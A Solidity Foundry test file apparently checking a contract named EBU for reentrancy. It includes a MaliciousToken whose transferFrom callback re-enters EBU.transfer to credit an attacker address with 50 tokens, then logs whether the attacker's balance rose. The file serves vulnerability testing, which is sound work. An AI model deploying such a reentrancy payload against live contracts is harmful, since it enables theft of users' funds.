// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/0xa46edd6a9a93feec36576ee5048146870ea2c3ae.sol";

contract EBU_Reentrancy_Test is Test {
    EBU ebu;
    MaliciousToken malToken;
    
    address alice = address(0x1111);
    address bob = address(0x2222);
    address charlie = address(0x3333);
    address attacker = address(0x4444);

    function setUp() public {
        ebu = new EBU();
        malToken = new MaliciousToken(address(ebu));
        
        // Authorize malicious token in EBU contract
        ebu.authorizeToken(address(malToken));
    }

    function testTransferReentrancy() public {
        // ===== Initial state snapshot =====
        console.log("--- BEFORE-Trigger State ---");
        uint256 preBob = ebu.getUserBalance(bob);
        uint256 preCharlie = ebu.getUserBalance(charlie);
        uint256 preAttacker = ebu.getUserBalance(attacker);
        console.log("Bob balance (pre):", preBob);
        console.log("Charlie balance (pre):", preCharlie);
        console.log("Attacker balance (pre):", preAttacker);

        // ===== Critical trigger operation =====
        console.log("--- Trigger Transfer (with reentrancy attack) ---");
        address[] memory initialRecipients = new address[](2);
        initialRecipients[0] = bob;
        initialRecipients[1] = charlie;
        
        uint256[] memory initialAmounts = new uint256[](2);
        initialAmounts[0] = 100;
        initialAmounts[1] = 100;
        
        ebu.transfer(alice, address(malToken), initialRecipients, initialAmounts);

        // ===== Post-trigger state snapshot =====
        console.log("--- AFTER-Trigger State ---");
        uint256 postBob = ebu.getUserBalance(bob);
        uint256 postCharlie = ebu.getUserBalance(charlie);
        uint256 postAttacker = ebu.getUserBalance(attacker);
        console.log("Bob balance (post):", postBob);
        console.log("Charlie balance (post):", postCharlie);
        console.log("Attacker balance (post):", postAttacker);

        // ===== Differential analysis =====
        uint256 attackerDiff = postAttacker - preAttacker;
        console.log("--- Differential Validation ---");
        console.log("Attacker balance change:", attackerDiff);
        
        // ===== Vulnerability verdict =====
        if(attackerDiff == 50) {
            console.log("Vulnerability Exists: Attacker gained 50 tokens via reentrancy");
        } else {
            console.log("Vulnerability not Exist: Attacker balance did not increase abnormally");
        }
    }
}

contract MaliciousToken {
    EBU public ebu;
    bool private attacked;

    constructor(address ebuAddress) {
        ebu = EBU(ebuAddress);
    }

    function transferFrom(address, address to, uint256) external returns (bool) {
        if (!attacked) {
            attacked = true;
            
            // Prepare reentrancy attack
            address[] memory attackRecipients = new address[](1);
            attackRecipients[0] = address(0x4444); // attacker address
            
            uint256[] memory attackAmounts = new uint256[](1);
            attackAmounts[0] = 50;
            
            address[] memory retargetedRecipients = new address[](1);
            retargetedRecipients[0] = to; // original recipient
            
            uint256[] memory retargetedAmounts = new uint256[](1);
            retargetedAmounts[0] = 100;
            
            // Launch attack transfers
            ebu.transfer(address(0), address(this), attackRecipients, attackAmounts);
            ebu.transfer(address(0), address(this), retargetedRecipients, retargetedAmounts);
        }
        return true;
    }
}